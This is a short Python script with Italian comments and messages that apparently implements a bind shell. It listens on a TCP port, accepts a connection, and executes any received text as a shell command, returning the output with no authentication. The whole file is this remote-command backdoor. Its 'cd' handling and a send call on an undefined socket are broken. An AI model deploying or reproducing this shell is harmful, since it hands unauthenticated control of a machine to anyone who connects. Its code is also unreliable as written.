import sys, socket, subprocess, time, os

def ricevi(conn):
    while(True):
        richiesta = conn.recv(1048000)
        cmd = richiesta.decode()
        if cmd.startswith("cd "):
            os.chdir(cmd)
            s.send(b"$ ")
            continue
        
        risposta = subprocess.run(cmd, shell = True, capture_output = True)
        data = risposta.stdout + risposta.stderr
        conn.send(data)

def conne_client(indirizzo, backlog = 1):
    try:
        s = socket.socket()
        s.bind(indirizzo)
        s.listen(backlog)
        print("server in ascolto")
    except socket.error as errore:
        print(f"frate qualcosa non va.\nforse c'è un altro server aperto \ncodice erorre: {errore}")
        time.sleep(15)
        sys.exit(0)
      
    conn, indirizzo_client = s.accept()
    print(f"conne stabilita con il client: {indirizzo_client}")
    ricevi(conn)

conne_client(("192.168.1.1", 15000))  # devi cambiare l'indirizzo ip se è differente

